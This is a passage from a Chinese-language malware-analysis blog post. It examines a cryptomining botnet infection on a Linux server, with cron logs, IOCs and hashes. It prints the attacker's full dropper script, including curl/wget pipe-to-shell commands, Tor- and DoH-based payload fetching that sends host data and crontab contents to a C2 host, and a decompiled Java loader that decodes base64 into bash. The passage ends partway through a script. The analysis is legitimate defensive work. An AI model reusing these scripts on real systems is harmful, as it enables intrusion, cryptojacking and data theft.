(/opt/systemd-private-jeAozqLbO5Ni2rtDL7lwAMXluzYQMl.sh &gt; /dev/null 2&gt;&amp;1 &amp;)\nJul 12 15:05:01 localhost CROND[22744]: (root) CMD (/root/.systemd-private-jeAozqLbO5Ni2rtDL7lwAMXluzYQMl.sh &gt; /dev/null 2&gt;&amp;1 &amp;)\nJul 12 15:07:13 localhost crontab[22899]: (root) BEGIN EDIT (root)\nJul 12 15:07:17 localhost crontab[22899]: (root) END EDIT (root)\nJul 12 15:29:01 localhost CROND[24501]: (root) CMD (/opt/systemd-private-jeAozqLbO5Ni2rtDL7lwAMXluzYQMl.sh &gt; /dev/null 2&gt;&amp;1 &amp;)\nJul 12 15:46:14 localhost crontab[28007]: (root) BEGIN EDIT (root)\nJul 12 15:46:30 localhost crontab[28152]: (root) BEGIN EDIT (root)\nJul 12 15:46:33 localhost crontab[28152]: (root) END EDIT (root)\nJun 15 03:42:01 localhost anacron[24559]: Job `cron.weekly' started\nJun 22 03:00:01 localhost anacron[7132]: Job `cron.weekly' started\nJun 22 03:01:01 localhost anacron[7216]: Job `cron.monthly' locked by another anacron - skipping\nJun 22 03:20:01 localhost anacron[7132]: Job `cron.monthly' started\nJun 29 03:29:01 localhost anacron[31965]: Job `cron.weekly' started\nJul  6 03:42:01 localhost anacron[20977]: Job `cron.weekly' started\nJul  9 12:48:01 localhost crond[723]: (CRON) bad minute (/etc/cron.d/systemdd)\nJul  9 12:48:01 localhost crond[723]: (CRON) bad minute (/etc/cron.d/systemdd)\nJul  9 12:48:01 localhost crond[723]: (CRON) bad minute (/etc/cron.d/systemdd)\nJul  9 12:48:01 localhost CROND[388]: (root) CMD (curl -fsS 139.59.150.7:443/rl|sh)\nJul  9 12:48:01 localhost CROND[389]: (root) CMD (wget -qO- 139.59.150.7:443/rl|sh)\nJul  9 12:48:02 localhost CROND[384]: (root) CMDOUT (sh: line 1: XRANDOM: command not found)\nJul  9 12:48:02 localhost CROND[383]: (root) CMDOUT (sh: line 1: XRANDOM: command not found)\nJul  9 13:05:02 localhost CROND[3957]: (root) CMD (/root/.systemd-private-jeAozqLbO5Ni2rtDL7lwAMXluzYQMl.sh &gt; /dev/null 2&gt;&amp;1 &amp;)\nJul  9 13:29:01 localhost CROND[6672]: (root) CMD (/opt/systemd-private-jeAozqLbO5Ni2rtDL7lwAMXluzYQMl.sh &gt; /dev/null 2&gt;&amp;1 &amp;)\nJul  9 13:33:59 localhost crond[7505]: (CRON) bad minute (/etc/cron.d/systemdd)\nJul  9 13:33:59 localhost crond[7505]: (CRON) bad minute (/etc/cron.d/systemdd)\nJul  9 13:33:59 localhost crond[7505]: (CRON) bad minute (/etc/cron.d/systemdd)\nJul  9 13:35:01 localhost CROND[7580]: (root) CMD (wget -qO- 139.59.150.7:443/rl|sh)\nJul  9 13:35:01 localhost CROND[7581]: (root) CMD (curl -fsS 139.59.150.7:443/rl|sh)\nJul  9 13:35:02 localhost CROND[7577]: (root) CMDOUT (sh: line 1: XRANDOM: command not found)\nJul  9 13:35:03 localhost CROND[7576]: (root) CMDOUT (sh: line 1: XRANDOM: command not found)\nJul  9 14:05:01 localhost CROND[11627]: (root) CMD (/root/.systemd-private-jeAozqLbO5Ni2rtDL7lwAMXluzYQMl.sh &gt; /dev/null 2&gt;&amp;1 &amp;)\nJul  9 14:29:04 localhost CROND[15270]: (root) CMD (/opt/systemd-private-jeAozqLbO5Ni2rtDL7lwAMXluzYQMl.sh &gt; /dev/null 2&gt;&amp;1 &amp;)\nJul  9 16:05:02 localhost CROND[28101]: (root) CMD (/root/.systemd-private-jeAozqLbO5Ni2rtDL7lwAMXluzYQMl.sh &gt; /dev/null 2&gt;&amp;1 &amp;)\nJul  9 16:29:03 localhost CROND[30857]: (root) CMD (/opt/systemd-private-jeAozqLbO5Ni2rtDL7lwAMXluzYQMl.sh &gt; /dev/null 2&gt;&amp;1 &amp;)\nJul  9 18:05:01 localhost CROND[9615]: (root) CMD (/root/.systemd-private-jeAozqLbO5Ni2rtDL7lwAMXluzYQMl.sh &gt; /dev/null 2&gt;&amp;1 &amp;)\nJul  9 18:29:01 localhost CROND[12804]: (root) CMD (/opt/systemd-private-jeAozqLbO5Ni2rtDL7lwAMXluzYQMl.sh &gt; /dev/null 2&gt;&amp;1 &amp;)\nJul 12 10:05:01 localhost CROND[2015]: (root) CMD (/root/.systemd-private-jeAozqLbO5Ni2rtDL7lwAMXluzYQMl.sh &gt; /dev/null 2&gt;&amp;1 &amp;)\n\n</code></pre></div></div>\n\n<p>重点关注两个关键的时间节点</p>\n\n<div class=\"language-plaintext highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code>Jul  9 12:48:01 localhost CROND[388]: (root) CMD (curl -fsS 139.59.150.7:443/rl|sh)\nJul  9 12:48:01 localhost CROND[389]: (root) CMD (wget -qO- 139.59.150.7:443/rl|sh)\nJul  9 13:05:02 localhost CROND[3957]: (root) CMD (/root/.systemd-private-jeAozqLbO5Ni2rtDL7lwAMXluzYQMl.sh &gt; /dev/null 2&gt;&amp;1 &amp;)\n</code></pre></div></div>\n\n<p>在执行目前的挖矿程序之前，攻击者首先执行了</p>\n\n<div class=\"language-plaintext highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code>curl -fsS 139.59.150.7:443/rl|sh\n</code></pre></div></div>\n\n<p>内容如下</p>\n\n<div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code>XRANDOM\n<span class=\"nb\">exec</span> &amp;&gt;/dev/null\n<span class=\"nb\">export </span><span class=\"nv\">PATH</span><span class=\"o\">=</span><span class=\"nv\">$PATH</span>:<span class=\"nv\">$HOME</span>:/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin\n\n<span class=\"k\">function </span>kurl<span class=\"o\">()</span> <span class=\"o\">{</span>\n  <span class=\"nb\">read </span>proto server path <span class=\"o\">&lt;&lt;&lt;</span><span class=\"si\">$(</span><span class=\"nb\">echo</span> <span class=\"k\">${</span><span class=\"nv\">1</span><span class=\"p\">//// </span><span class=\"k\">}</span><span class=\"si\">)</span>\n  <span class=\"nv\">DOC</span><span class=\"o\">=</span>/<span class=\"k\">${</span><span class=\"nv\">path</span><span class=\"p\">// //</span><span class=\"k\">}</span>\n  <span class=\"nv\">HOST</span><span class=\"o\">=</span><span class=\"k\">${</span><span class=\"nv\">server</span><span class=\"p\">//</span>:<span class=\"p\">*</span><span class=\"k\">}</span>\n  <span class=\"nv\">PORT</span><span class=\"o\">=</span><span class=\"k\">${</span><span class=\"nv\">server</span><span class=\"p\">//*</span>:<span class=\"k\">}</span>\n  <span class=\"o\">[[</span> x<span class=\"s2\">\"</span><span class=\"k\">${</span><span class=\"nv\">HOST</span><span class=\"k\">}</span><span class=\"s2\">\"</span> <span class=\"o\">==</span> x<span class=\"s2\">\"</span><span class=\"k\">${</span><span class=\"nv\">PORT</span><span class=\"k\">}</span><span class=\"s2\">\"</span> <span class=\"o\">]]</span> <span class=\"o\">&amp;&amp;</span> <span class=\"nv\">PORT</span><span class=\"o\">=</span>80\n\n  <span class=\"nb\">exec </span>3&lt;<span class=\"o\">&gt;</span>/dev/tcp/<span class=\"k\">${</span><span class=\"nv\">HOST</span><span class=\"k\">}</span>/<span class=\"nv\">$PORT</span>\n  <span class=\"nb\">echo</span> <span class=\"nt\">-en</span> <span class=\"s2\">\"GET </span><span class=\"k\">${</span><span class=\"nv\">DOC</span><span class=\"k\">}</span><span class=\"s2\"> HTTP/1.0</span><span class=\"se\">\\r\\n</span><span class=\"s2\">Host: </span><span class=\"k\">${</span><span class=\"nv\">HOST</span><span class=\"k\">}</span><span class=\"se\">\\r\\n\\r\\n</span><span class=\"s2\">\"</span> <span class=\"o\">&gt;</span>&amp;3\n  <span class=\"o\">(</span><span class=\"k\">while </span><span class=\"nb\">read </span>line<span class=\"p\">;</span> <span class=\"k\">do</span>\n   <span class=\"o\">[[</span> <span class=\"s2\">\"</span><span class=\"nv\">$line</span><span class=\"s2\">\"</span> <span class=\"o\">==</span> <span class=\"s1\">$'</span><span class=\"se\">\\r</span><span class=\"s1\">'</span> <span class=\"o\">]]</span> <span class=\"o\">&amp;&amp;</span> <span class=\"nb\">break\n  </span><span class=\"k\">done</span> <span class=\"o\">&amp;&amp;</span> <span class=\"nb\">cat</span><span class=\"o\">)</span> &lt;&amp;3\n  <span class=\"nb\">exec </span>3&gt;&amp;-\n<span class=\"o\">}</span>\n\n<span class=\"nb\">rm</span> <span class=\"nt\">-f</span> <span class=\"nv\">$HOME</span>/ss\ncurl <span class=\"nt\">-V</span> <span class=\"o\">||</span> wget <span class=\"nt\">-q</span> https://github.com/moparisthebest/static-curl/releases/download/v7.75.0/curl-amd64 <span class=\"nt\">-O</span> <span class=\"nv\">$HOME</span>/curl<span class=\"p\">;</span><span class=\"nb\">chmod</span> +x <span class=\"nv\">$HOME</span>/curl\ncurl <span class=\"nt\">-V</span> <span class=\"o\">||</span> kurl http://139.59.150.7:443/curl <span class=\"o\">&gt;</span> <span class=\"nv\">$HOME</span>/curl<span class=\"p\">;</span><span class=\"nb\">chmod</span> +x <span class=\"nv\">$HOME</span>/curl\nss <span class=\"nt\">-v</span>   <span class=\"o\">||</span> kurl http://139.59.150.7:443/ss   <span class=\"o\">&gt;</span> <span class=\"nv\">$HOME</span>/ss<span class=\"p\">;</span><span class=\"nb\">chmod</span> +x <span class=\"nv\">$HOME</span>/ss\nss <span class=\"nt\">-v</span>   <span class=\"o\">||</span> curl <span class=\"nt\">-s</span> http://139.59.150.7:443/ss <span class=\"nt\">-o</span> <span class=\"nv\">$HOME</span>/ss<span class=\"p\">;</span><span class=\"nb\">chmod</span> +x <span class=\"nv\">$HOME</span>/ss\nps      <span class=\"o\">||</span> curl <span class=\"nt\">-s</span> http://139.59.150.7:443/ps <span class=\"nt\">-o</span> <span class=\"nv\">$HOME</span>/ps<span class=\"p\">;</span><span class=\"nb\">chmod</span> +x <span class=\"nv\">$HOME</span>/ps\n\n<span class=\"nv\">d</span><span class=\"o\">=</span><span class=\"si\">$(</span><span class=\"nb\">grep </span>x:<span class=\"si\">$(</span><span class=\"nb\">id</span> <span class=\"nt\">-u</span><span class=\"si\">)</span>: /etc/passwd|cut <span class=\"nt\">-d</span>: <span class=\"nt\">-f6</span><span class=\"si\">)</span>\n<span class=\"nv\">c</span><span class=\"o\">=</span><span class=\"si\">$(</span><span class=\"nb\">echo</span> <span class=\"s2\">\"curl -4fsSLkA- -m200\"</span><span class=\"si\">)</span>\n<span class=\"nv\">t</span><span class=\"o\">=</span><span class=\"si\">$(</span><span class=\"nb\">echo</span> <span class=\"s2\">\"rxmxpzfkydkulhhqnuftbmf6d5q67jjchopmh4ofszfwwnmz4bqq2fid\"</span><span class=\"si\">)</span>\n\nsockz<span class=\"o\">()</span> <span class=\"o\">{</span>\n<span class=\"nv\">n</span><span class=\"o\">=(</span>doh.defaultroutes.de dns.hostux.net uncensored.lux1.dns.nixnet.xyz dns.rubyfish.cn dns.twnic.tw doh.centraleu.pi-dns.com doh.dns.sb doh-fi.blahdns.com <span class=\"k\">fi</span>.doh.dns.snopyta.org dns.flatuslifir.is doh.li dns.digitale-gesellschaft.ch<span class=\"o\">)</span>\n<span class=\"nv\">p</span><span class=\"o\">=</span><span class=\"si\">$(</span><span class=\"nb\">echo</span> <span class=\"s2\">\"dns-query?name=relay.tor2socks.in\"</span><span class=\"si\">)</span>\n<span class=\"nv\">s</span><span class=\"o\">=</span><span class=\"si\">$(</span><span class=\"nv\">$c</span> https://<span class=\"k\">${</span><span class=\"nv\">n</span><span class=\"p\">[</span><span class=\"k\">$((</span>RANDOM%10<span class=\"k\">))</span><span class=\"p\">]</span><span class=\"k\">}</span>/<span class=\"nv\">$p</span> | <span class=\"nb\">grep</span> <span class=\"nt\">-oE</span> <span class=\"s2\">\"</span><span class=\"se\">\\b</span><span class=\"s2\">([0-9]{1,3}</span><span class=\"se\">\\.</span><span class=\"s2\">){3}[0-9]{1,3}</span><span class=\"se\">\\b</span><span class=\"s2\">\"</span> |tr <span class=\"s1\">' '</span> <span class=\"s1\">'\\n'</span>|grep <span class=\"nt\">-Ev</span> <span class=\"o\">[</span>.]0|sort <span class=\"nt\">-uR</span>|head <span class=\"nt\">-n</span> 1<span class=\"si\">)</span>\n<span class=\"o\">}</span>\n\nfexe<span class=\"o\">()</span> <span class=\"o\">{</span>\n<span class=\"k\">for </span>i <span class=\"k\">in</span> <span class=\"nb\">.</span> <span class=\"nv\">$HOME</span> /usr/bin <span class=\"nv\">$d</span> /tmp /var/tmp <span class=\"p\">;</span><span class=\"k\">do </span><span class=\"nb\">echo exit</span> <span class=\"o\">&gt;</span> <span class=\"nv\">$i</span>/i <span class=\"o\">&amp;&amp;</span> <span class=\"nb\">chmod</span> +x <span class=\"nv\">$i</span>/i <span class=\"o\">&amp;&amp;</span> <span class=\"nb\">cd</span> <span class=\"nv\">$i</span> <span class=\"o\">&amp;&amp;</span> ./i <span class=\"o\">&amp;&amp;</span> <span class=\"nb\">rm</span> <span class=\"nt\">-f</span> i <span class=\"o\">&amp;&amp;</span> <span class=\"nb\">break</span><span class=\"p\">;</span><span class=\"k\">done</span>\n<span class=\"o\">}</span>\n\nu<span class=\"o\">()</span> <span class=\"o\">{</span>\nsockz\n<span class=\"nv\">f</span><span class=\"o\">=</span>/l/rd.<span class=\"si\">$(</span><span class=\"nb\">uname</span> <span class=\"nt\">-m</span><span class=\"si\">)</span>\n<span class=\"nv\">x</span><span class=\"o\">=</span>./<span class=\"si\">$(</span><span class=\"nb\">date</span>|md5sum|cut <span class=\"nt\">-f1</span> <span class=\"nt\">-d-</span><span class=\"si\">)</span>\n<span class=\"nv\">r</span><span class=\"o\">=</span><span class=\"si\">$(</span>curl <span class=\"nt\">-4fsSLk</span> checkip.amazonaws.com||curl <span class=\"nt\">-4fsSLk</span> ip.sb<span class=\"si\">)</span>_<span class=\"si\">$(</span><span class=\"nb\">whoami</span><span class=\"si\">)</span>_<span class=\"si\">$(</span><span class=\"nb\">uname</span> <span class=\"nt\">-m</span><span class=\"si\">)</span>_<span class=\"si\">$(</span><span class=\"nb\">uname</span> <span class=\"nt\">-n</span><span class=\"si\">)</span>_<span class=\"si\">$(</span>ip a|grep <span class=\"s1\">'inet '</span>|awk <span class=\"o\">{</span><span class=\"s1\">'print $2'</span><span class=\"o\">}</span>|md5sum|awk <span class=\"o\">{</span><span class=\"s1\">'print $1'</span><span class=\"o\">}</span><span class=\"si\">)</span>_<span class=\"si\">$(</span>crontab <span class=\"nt\">-l</span>|base64 <span class=\"nt\">-w0</span><span class=\"si\">)</span>\n<span class=\"nv\">$c</span> <span class=\"nt\">-x</span> socks5h://<span class=\"nv\">$s</span>:9050 <span class=\"nv\">$t</span>.onion<span class=\"nv\">$f</span> <span class=\"nt\">-o</span><span class=\"nv\">$x</span> <span class=\"nt\">-e</span><span class=\"nv\">$r</span> <span class=\"o\">||</span> <span class=\"nv\">$c</span> <span class=\"nv\">$1$f</span> <span class=\"nt\">-o</span><span class=\"nv\">$x</span> <span class=\"nt\">-e</span><span class=\"nv\">$r</span>\n<span class=\"nb\">chmod</span> +x <span class=\"nv\">$x</span><span class=\"p\">;</span><span class=\"nv\">$x</span><span class=\"p\">;</span><span class=\"nb\">rm</span> <span class=\"nt\">-f</span> <span class=\"nv\">$x</span>\n<span class=\"o\">}</span>\n\n<span class=\"k\">for </span>h <span class=\"k\">in </span>tor2web.in tor2web.it onion.foundation onion.com.de onion.sh tor2web.su\n<span class=\"k\">do\nif</span> <span class=\"o\">!</span> <span class=\"nb\">ls</span> /proc/<span class=\"si\">$(</span><span class=\"nb\">head</span> <span class=\"nt\">-n</span> 1 /tmp/.X11-unix/01<span class=\"si\">)</span>/status<span class=\"p\">;</span> <span class=\"k\">then\n</span>fexe<span class=\"p\">;</span>u <span class=\"nv\">$t</span>.<span class=\"nv\">$h</span>\n<span class=\"nb\">ls</span> /proc/<span class=\"si\">$(</span><span class=\"nb\">head</span> <span class=\"nt\">-n</span> 1 /tmp/.X11-unix/01<span class=\"si\">)</span>/status <span class=\"o\">||</span> <span class=\"o\">(</span><span class=\"nb\">cd</span> /tmp<span class=\"p\">;</span>u <span class=\"nv\">$t</span>.<span class=\"nv\">$h</span><span class=\"o\">)</span>\n<span class=\"nb\">ls</span> /proc/<span class=\"si\">$(</span><span class=\"nb\">head</span> <span class=\"nt\">-n</span> 1 /tmp/.X11-unix/01<span class=\"si\">)</span>/status <span class=\"o\">||</span> <span class=\"o\">(</span><span class=\"nb\">cd</span> /dev/shm<span class=\"p\">;</span>u <span class=\"nv\">$t</span>.<span class=\"nv\">$h</span><span class=\"o\">)</span>\n<span class=\"k\">else\n</span><span class=\"nb\">break\n</span><span class=\"k\">fi\ndone\n</span><span class=\"nb\">rm</span> <span class=\"nt\">-f</span> /etc/cron.d/systemdd\n\n</code></pre></div></div>\n\n<p>内容和分析过的脚本差不多，没有什么新的消息。</p>\n\n<p>奇安信 ti 和微步在线没有关于 <code class=\"language-plaintext highlighter-rouge\">139.59.150.7</code> 更多的比较有用的信息了。</p>\n\n<p>查了下 ssh 记录，只保留了最近一周多的记录，之前的记录没了，口令也不是弱口令啊 :(</p>\n\n<p>注意到机器开了 6379</p>\n\n<p>试了下，redis 没密码 :)</p>\n\n<p>但是真的是 redis 打进来的么，看看 redis的执行记录</p>\n\n<div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"nb\">cat</span> ~/.rediscli_history\n</code></pre></div></div>\n\n<p>里面没有用到和 <code class=\"language-plaintext highlighter-rouge\">config</code> 等可疑的命令，意味着攻击者可能没有用 redis 的洞打进来，或者打进来了然后删除了记录，个人感觉使用 redis 洞的概率较小</p>\n\n<p>那么攻击者到底如何进来的，目前还是未解之谜 :)</p>\n\n<p>这个攻击者为了规避监测，做了不少的工作，让人感觉稍微比以前分析过的黑产有意思一点了。刚开始分析的时候觉得他的恶意程序太长了，但是仔细分析可以知道他们的为了规避审而做的隐藏还是很有价值的，包括使用 doh 解析域名， tor 代理下载恶意文件，应该能成功绕过 IDS 的审查。</p>\n\n<p>看完代码，感觉这可能不只是挖矿这么简单，他的载荷任意修改就可以变成对抗一般的 IDS 的战略武器了</p>\n\n<p>要说这是APT我都信，不过这似乎的确是个挖矿程序 :)</p>\n\n<p><img src=\"https://static.scuseek.com/20210712165241.png\" alt=\"\" /></p>\n\n<p>看起来应该不是白象的攻击，APT 以钓鱼为主，重点在隐蔽，不会大张旗鼓的搞挖矿。</p>\n\n<p>既然有 tor 域名，那么这可以当作一个 IOC，去网上搜一搜，发现不少这样的案例</p>\n\n<div class=\"language-plaintext highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code>bggts547gukhvmf4cgandlgxxphengxovoyo6ewhns5qmmb2b5oi43yd\n</code></pre></div></div>\n\n<p>https://cloud.tencent.com/developer/article/1731875</p>\n\n<p>https://www.zscaler.com/blogs/security-research/dreambus-botnet-technical-analysis</p>\n\n<p>https://www.trendmicro.com/en_us/research/21/d/tor-based-botnet-malware-targets-linux-systems-abuses-cloud-management-tools.html</p>\n\n<p><del>值得注意的是， zscaler 的样本似乎比我拿到的样本功能更多， zscaler 的样本包括了通过 ssh/redis/postgres/hadoop/spark等横向移动的功能。推测可能是其他设备上有包含这种功能的木马攻破我分析的这台设备后放置了一个功能更单一的木马，以规避安全人员的入侵分析。</del>2021.7.20 注：写这篇文章的时候没发现这几个横向移动的功能，事后分析发现了这几个移动方式。</p>\n\n<p>复制出来的恶意文件的IOC也在微步在线有看到</p>\n\n<p><img src=\"https://static.scuseek.com/20210712170908.png\" alt=\"\" /></p>\n\n<p>删木马用了3分钟，写博客用了3小时 :)</p>\n\n<p>我感觉导师要找我交流进度了</p>\n\n<p>我又只有说我摸鱼了  555555</p>\n\n<p>附IOC如下：</p>\n\n<div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"nv\">$ </span><span class=\"nb\">md5sum</span> <span class=\"k\">*</span>\n1903a412002ed21dd7d90858f46717ca  EQnR3jNR\nf411ce55ff4b6ae95d11944a0c8d594b  tracepath\n48b164b19a85b94be0548c542d315e31  yitxXFrW\n<span class=\"nv\">$ </span><span class=\"nb\">sha256sum</span> <span class=\"k\">*</span>\na33a641e1c866164930a5acf934231fc9896a5ad5e47bbf0784f65430e86f0dd  EQnR3jNR\nc38c6d9ddf08ee411bedb00cc5bfd03f78af774ff408ab160e6149607bc76046  tracepath\ncdf9ddd2f3eac918aa25c507d7b121ba670f241e5647b23e645a9f9e35f9665a  yitxXFrW\n\n</code></pre></div></div>\n\n<h1 id=\"恶意文件分析\">恶意文件分析</h1>\n\n<p>他来了，曾大佬真的来了。</p>\n\n<p>曾大佬出手，分分钟拿下。</p>\n\n<p>什么加壳去特征，都不是问题，曾大佬动态调试全带走 :)</p>\n\n<p>我问他怎么还有时间搞这个，他说要不是不想看论文，谁会去分析这个挖矿木马呢？</p>\n\n<p>这句话怎么似曾相似，啊，原来是我刚开始写这篇博客的时候也是这样说的 :P</p>\n\n<h2 id=\"tracepath\">tracepath</h2>\n\n<p>包含了横向移动的功能。</p>\n\n<p>如果发现有 spark 节点，那么提交一个任务上去。</p>\n\n<p>从 <code class=\"language-plaintext highlighter-rouge\">http://139.59.150.7:443/z.jar</code> 下载 <code class=\"language-plaintext highlighter-rouge\">z.jar</code>，提交上去。</p>\n\n<p>那么，<code class=\"language-plaintext highlighter-rouge\">z.jar</code> 是什么呢？目前还可以从这个ip地址上下载这个恶意文件。</p>\n\n<p>丢进 jd-gui，看到文件的 java 代码</p>\n\n<div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code>public class z <span class=\"o\">{</span>\n  public static void main<span class=\"o\">(</span>String[] paramArrayOfString<span class=\"o\">)</span> throws Exception <span class=\"o\">{</span>\n    String[] arrayOfString <span class=\"o\">=</span> new String[3]<span class=\"p\">;</span>\n    arrayOfString[0] <span class=\"o\">=</span> <span class=\"s2\">\"/bin/sh\"</span><span class=\"p\">;</span>\n    arrayOfString[1] <span class=\"o\">=</span> <span class=\"s2\">\"-c\"</span><span class=\"p\">;</span>\n    arrayOfString[2] <span class=\"o\">=</span> <span class=\"s2\">\"echo WFJBTkRPTQpleGVjICY+L2Rldi9udWxsCmV4cG9ydCBQQVRIPSRQQVRIOiRIT01FOi9iaW46L3NiaW46L3Vzci9iaW46L3Vzci9zYmluOi91c3IvbG9jYWwvYmluOi91c3IvbG9jYWwvc2JpbgoKZnVuY3Rpb24ga3VybCgpIHsKICByZWFkIHByb3RvIHNlcnZlciBwYXRoIDw8PCQoZWNobyAkezEvLy8vIH0pCiAgRE9DPS8ke3BhdGgvLyAvL30KICBIT1NUPSR7c2VydmVyLy86Kn0KICBQT1JUPSR7c2VydmVyLy8qOn0KICBbWyB4IiR7SE9TVH0iID09IHgiJHtQT1JUfSIgXV0gJiYgUE9SVD04MAoKICBleGVjIDM8Pi9kZXYvdGNwLyR7SE9TVH0vJFBPUlQKICBlY2hvIC1lbiAiR0VUICR7RE9DfSBIVFRQLzEuMFxyXG5Ib3N0OiAke0hPU1R9XHJcblxyXG4iID4mMwogICh3aGlsZSByZWFkIGxpbmU7IGRvCiAgIFtbICIkbGluZSIgPT0gJCdccicgXV0gJiYgYnJlYWsKICBkb25lICYmIGNhdCkgPCYzCiAgZXhlYyAzPiYtCn0KCnJtIC1mICRIT01FL3NzCmN1cmwgLVYgfHwgd2dldCAtcSBodHRwczovL2dpdGh1Yi5jb20vbW9wYXJpc3RoZWJlc3Qvc3RhdGljLWN1cmwvcmVsZWFzZXMvZG93bmxvYWQvdjcuNzUuMC9jdXJsLWFtZDY0IC1PICRIT01FL2N1cmw7Y2htb2QgK3ggJEhPTUUvY3VybApjdXJsIC1WIHx8IGt1cmwgaHR0cDovLzEzOS41OS4xNTAuNzo0NDMvY3VybCA+ICRIT01FL2N1cmw7Y2htb2QgK3ggJEhPTUUvY3VybApzcyAtdiAgIHx8IGt1cmwgaHR0cDovLzEzOS41OS4xNTAuNzo0NDMvc3MgICA+ICRIT01FL3NzO2NobW9kICt4ICRIT01FL3NzCnNzIC12ICAgfHwgY3VybCAtcyBodHRwOi8vMTM5LjU5LjE1MC43OjQ0My9zcyAtbyAkSE9NRS9zcztjaG1vZCAreCAkSE9NRS9zcwpwcyAgICAgIHx8IGN1cmwgLXMgaHR0cDovLzEzOS41OS4xNTAuNzo0NDMvcHMgLW8gJEhPTUUvcHM7Y2htb2QgK3ggJEhPTUUvcHMKCmQ9JChncmVwIHg6JChpZCAtdSk6IC9ldGMvcGFzc3dkfGN1dCAtZDogLWY2KQpjPSQoZWNobyAiY3VybCAtNGZzU0xrQS0gLW0yMDAiKQp0PSQoZWNobyAicnhteHB6Zmt5ZGt1bGhocW51ZnRibWY2ZDVxNjdqamNob3BtaDRvZnN6Znd3bm16NGJxcTJmaWQiKQoKc29ja3ooKSB7Cm49KGRvaC5ubC5haGFkbnMubmV0IGRucy5ob3N0dXgubmV0IHVuY2Vuc29yZWQubHV4MS5kbnMubml4bmV0Lnh5eiBkbnMucnVieWZpc2guY24gZG5zLnR3bmljLnR3IGRvaC5uby5haGFkbnMubmV0IGRvaC1maS5ibGFoZG5zLmNvbSBmaS5kb2guZG5zLnNub3B5dGEub3JnIHJlc29sdmVyLWV1LmxlbHV4LmZpIGRvaC5saSBkbnMuZGlnaXRhbGUtZ2VzZWxsc2NoYWZ0LmNoKQpwPSQoZWNobyAiZG5zLXF1ZXJ5P25hbWU9cmVsYXkudG9yMnNvY2tzLmluIikKcz0kKCRjIGh0dHBzOi8vJHtuWyQoKFJBTkRPTSUxMSkpXX0vJHAgfCBncmVwIC1vRSAiXGIoWzAtOV17MSwzfVwuKXszfVswLTldezEsM31cYiIgfHRyICcgJyAnXG4nfGdyZXAgLUV2IFsuXTB8c29ydCAtdVJ8aGVhZCAtbiAxKQp9CgpmZXhlKCkgewpmb3IgaSBpbiAuICRIT01FIC91c3IvYmluICRkIC90bXAgL3Zhci90bXAgO2RvIGVjaG8gZXhpdCA+ICRpL2kgJiYgY2htb2QgK3ggJGkvaSAmJiBjZCAkaSAmJiAuL2kgJiYgcm0gLWYgaSAmJiBicmVhaztkb25lCn0KCnUoKSB7CnNvY2t6CmY9L2wvc3AuJCh1bmFtZSAtbSkKeD0uLyQoZGF0ZXxtZDVzdW18Y3V0IC1mMSAtZC0pCnI9JChjdXJsIC00ZnNTTGsgY2hlY2tpcC5hbWF6b25hd3MuY29tfHxjdXJsIC00ZnNTTGsgaXAuc2IpXyQod2hvYW1pKV8kKHVuYW1lIC1tKV8kKHVuYW1lIC1uKV8kKGlwIGF8Z3JlcCAnaW5ldCAnfGF3ayB7J3ByaW50ICQyJ318bWQ1c3VtfGF3ayB7J3ByaW50ICQxJ30pXyQoY3JvbnRhYiAtbHxiYXNlNjQgLXcwKQokYyAteCBzb2NrczVoOi8vJHM6OTA1MCAkdC5vbmlvbiRmIC1vJHggLWUkciB8fCAkYyAkMSRmIC1vJHggLWUkcgpjaG1vZCAreCAkeDskeDtybSAtZiAkeAp9Cgpmb3IgaCBpbiB0b3Iyd2ViLmluIHRvcjJ3ZWIuaXQKZG8KaWYgISBscyAvcHJvYy8kKGhlYWQgLW4gMSAvdG1wLy5YMTEtdW5peC8wMSkvc3RhdHVzOyB0aGVuCmZleGU7dSAkdC4kaApscyAvcHJvYy8kKGhlYWQgLW4gMSAvdG1wLy5YMTEtdW5peC8wMSkvc3RhdHVzIHx8IChjZCAvdG1wO3UgJHQuJGgpCmxzIC9wcm9jLyQoaGVhZCAtbiAxIC90bXAvLlgxMS11bml4LzAxKS9zdGF0dXMgfHwgKGNkIC9kZXYvc2htO3UgJHQuJGgpCmVsc2UKYnJlYWsKZmkKZG9uZQo=|base64 -d|bash\"</span><span class=\"p\">;</span>\n    Runtime runtime <span class=\"o\">=</span> Runtime.getRuntime<span class=\"o\">()</span><span class=\"p\">;</span>\n    Process process <span class=\"o\">=</span> runtime.exec<span class=\"o\">(</span>arrayOfString<span class=\"o\">)</span><span class=\"p\">;</span>\n  <span class=\"o\">}</span>\n<span class=\"o\">}</span>\n\n</code></pre></div></div>\n\n<p>这一大段 base64 解出来，内容如下</p>\n\n<div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code>XRANDOM\n<span class=\"nb\">exec</span> &amp;&gt;/dev/null\n<span class=\"nb\">export </span><span class=\"nv\">PATH</span><span class=\"o\">=</span><span class=\"nv\">$PATH</span>:<span class=\"nv\">$HOME</span>:/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin\n\n<span class=\"k\">function </span>kurl<span class=\"o\">()</span> <span class=\"o\">{</span>\n  <span class=\"nb\">read </span>proto server path <span class=\"o\">&lt;&lt;&lt;</span><span class=\"si\">$(</span><span class=\"nb\">echo</span> <span class=\"k\">${</span><span class=\"nv\">1</span><span class=\"p\">//// </span><span class=\"k\">}</span><span class=\"si\">)</span>\n  <span class=\"nv\">DOC</span><span class=\"o\">=</span>/<span class=\"k\">${</span><span class=\"nv\">path</span><span class=\"p\">// //</span><span class=\"k\">}</span>\n  <span class=\"nv\">HOST</span><span class=\"o\">=</span><span class=\"k\">${</span><span class=\"nv\">server</span><span class=\"p\">//</span>:<span class=\"p\">*</span><span class=\"k\">}</span>\n  <span class=\"nv\">PORT</span><span class=\"o\">=</span><span class=\"k\">${</span><span class=\"nv\">server</span><span class=\"p\">//*</span>:<span class=\"k\">}</span>\n  <span class=\"o\">[[</span> x<span class=\"s2\">\"</span><span class=\"k\">${</span><span 